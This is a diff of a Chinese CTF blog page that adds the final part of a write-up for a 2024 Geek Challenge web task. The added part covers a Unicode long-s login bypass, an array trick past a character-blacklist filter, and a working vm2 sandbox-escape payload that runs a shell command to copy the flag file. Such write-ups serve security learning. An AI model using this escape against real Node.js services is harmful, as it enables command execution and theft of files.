+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span> <span class="o">||</span> <span class="s2">&#34;/(abcdefghijklmnopqrstuvwxyz123456789&#39;\&#34;.&#34;</span><span class="p">.</span><span class="nx">split</span><span class="sb">``</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span> <span class="o">===</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">code</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;*&#34;</span> <span class="o">+</span> <span class="nx">code</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 创建安全的VM沙箱环境（限制访问权限）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">sandbox</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">require</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> <span class="c1">// 禁用require()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">setTimeout</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> <span class="c1">// 禁用setTimeout()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">setInterval</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> <span class="c1">// 禁用setInterval()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">clearTimeout</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> <span class="c1">// 禁用clearTimeout()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">clearInterval</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> <span class="c1">// 禁用clearInterval()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">console</span><span class="o">:</span> <span class="nx">console</span> <span class="c1">// 允许使用console
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 在沙箱中执行代码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;执行结果:&#39;</span><span class="p">,</span> <span class="nx">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;代码执行成功&#39;</span><span class="p">,</span> <span class="nx">result</span><span class="o">:</span> <span class="nx">result</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 处理执行过程中出现的错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;执行错误:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;代码执行出错&#39;</span><span class="p">,</span> <span class="nx">details</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">message</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 根路由 - 返回首页
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;public&#39;</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 全局异常捕获（未捕获的异常）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;捕获到未处理的异常:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 注意：除非特别处理，否则进程通常会在此处退出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 全局Promise拒绝捕获（未处理的Promise拒绝）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;unhandledRejection&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">reason</span><span class="p">,</span> <span class="nx">promise</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;捕获到未处理的Promise错误:&#39;</span><span class="p">,</span> <span class="nx">reason</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 模拟错误（用于测试错误处理）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;模拟的错误&#34;</span><span class="p">);</span> <span class="c1">// 模拟同步错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Promise</span><span class="p">.</span><span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;模拟的Promise错误&#34;</span><span class="p">));</span> <span class="c1">// 模拟Promise拒绝
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 启动服务器，监听3000端口
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;服务器正在3000端口运行&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<strong>Unicode大小写转换不一致性</strong> 特殊字符 <code>ſ</code>（U+017F，长s字符），它小写形式是 <code>ſ</code>（不等于 &ldquo;s&rdquo;），大写形式会变成 <code>S</code></p>
+<img src="image-20250809154731388.png" alt="image-20250809154731388" style="zoom:50%;" />
+<p>所以登入有：ſyclover/J1rrY</p>
+<p>之后就打vm2逃逸https://github.com/patriksimek/vm2/security，这里打第一个就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">customInspectSymbol</span> <span class="o">=</span> <span class="nx">Symbol</span><span class="p">.</span><span class="k">for</span><span class="p">(</span><span class="s1">&#39;nodejs.util.inspect.custom&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">customInspectSymbol</span><span class="p">]</span><span class="o">:</span> <span class="p">(</span><span class="nx">depth</span><span class="p">,</span> <span class="nx">opt</span><span class="p">,</span> <span class="nx">inspect</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">inspect</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)().</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;cat /f* &gt;/app/public/1.txt&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">valueOf</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">compileStreaming</span><span class="p">(</span><span class="nx">obj</span><span class="p">).</span><span class="k">catch</span><span class="p">(()=&gt;{});</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然还一个waf，数组绕过code.length 和 code.slice 的判断就行（<code>code[0]</code>是整个字符串，不在黑名单里（黑名单只检查单字符），所以不会被替换。）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span> <span class="o">||</span> <span class="s2">&#34;/(abcdefghijklmnopqrstuvwxyz123456789&#39;\&#34;.&#34;</span><span class="p">.</span><span class="nx">split</span><span class="sb">``</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span> <span class="o">===</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">code</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;*&#34;</span> <span class="o">+</span> <span class="nx">code</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250809161009365.png" alt="image-20250809161009365" style="zoom:50%;" />
+<p>然后访问1.txt就行</p>
+<p>至此：2024极客写完，学到很多东西，零零散散着学，浪费不少时间			&ndash;8月9日</p>
+
 </section>
 
 
@@ -3504,6 +4130,32 @@
             
                 
 <article class="">
+    <a href="/p/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2023-极客大挑战</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9Fctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-第十届上海大学生ctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-swpu-nssctf/">
         
         
@@ -3536,32 +4188,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-Nepctf</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-7%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-7月每日一题</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025%E5%A4%8F%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025夏季春秋杯</h2>
         </div>
     </a>
 </article>
